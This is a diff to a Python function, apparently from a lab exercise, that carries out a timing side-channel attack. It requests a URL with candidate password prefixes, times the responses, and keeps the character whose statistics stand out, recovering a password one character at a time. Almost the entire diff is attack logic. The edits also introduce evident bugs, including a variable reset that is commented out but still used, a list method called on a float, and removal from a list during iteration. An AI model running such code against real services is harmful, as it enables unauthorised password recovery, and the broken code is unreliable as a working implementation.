@@ -54,27 +54,43 @@ def find_tav():
         print(f'checking password: {pass_checked} time was measured: {time_values[-1]}')
     #calculate the statistics for finding the correct lowest time
     average = sum(time_values) / len(time_values)
+    print(f' the average is:{average}')
     standart_devitation = stdev(time_values)
-    POOL = ''
+    print(f'the std is : {standart_devitation}')
+    # POOL = ''
     for time in time_values:
-        if time - average < -0.5*standart_devitation:
+        if time - average > 0.8*standart_devitation:
+            print(f'the password {temp_pass + POOL[time_values.index(time)]} std is: {time - average}')
             possible_mins.append((time, temp_pass + POOL[time_values.index(time)]))# a tupple of the possible min time and the pass
             POOL += possible_mins[-1][1][-1]
+    # while len(possible_mins) > 1:
+    #     time_values = []
+    #     possible_mins = []
+    #     for tav in POOL:
+    #         pass_checked = temp_pass + tav
+    #         executed_url = url + "/" + pass_checked.ljust(pswd_len, '*')
+    #         time_values.append(min(timeit(executed_url, 5)))
+    #         print(f'checking password: {pass_checked} time was measured: {time_values[-1]}')
+    #     POOL = ''
+    #     for time in time_values:
+    #         if time - average < -0.5 * standart_devitation:
+    #             possible_mins.append((time, temp_pass + POOL[time_values.index(time)]))  # a tupple of the possible min time and the pass
+    #             POOL += possible_mins[-1][1][-1]
+
+    if len(possible_mins) == 0:
+        return POOL[time.index(max(time_values))]
     while len(possible_mins) > 1:
-        time_values = []
-        possible_mins = []
-        for tav in POOL:
-            pass_checked = temp_pass + tav
+        for possible in possible_mins:
+            pass_checked = possible[1]
             executed_url = url + "/" + pass_checked.ljust(pswd_len, '*')
-            time_values.append(min(timeit(executed_url, 5)))
-            print(f'checking password: {pass_checked} time was measured: {time_values[-1]}')
-        POOL = ''
-        for time in time_values:
-            if time - average < -0.5 * standart_devitation:
-                possible_mins.append((time, temp_pass + POOL[time_values.index(time)]))  # a tupple of the possible min time and the pass
-                POOL += possible_mins[-1][1][-1]
+            time = min(timeit(executed_url, 5))
+
+            print(f'checking password: {pass_checked} time was measured: {time}')
+            if time - average < 1*standart_devitation:
+                possible_mins.remove(possible)
     print(f' password part found: {possible_mins[0][1]} which gave the min time: {possible_mins[0][0]} ')
     return possible_mins[0][1][-1]
+
 
 
         # if num > 1:
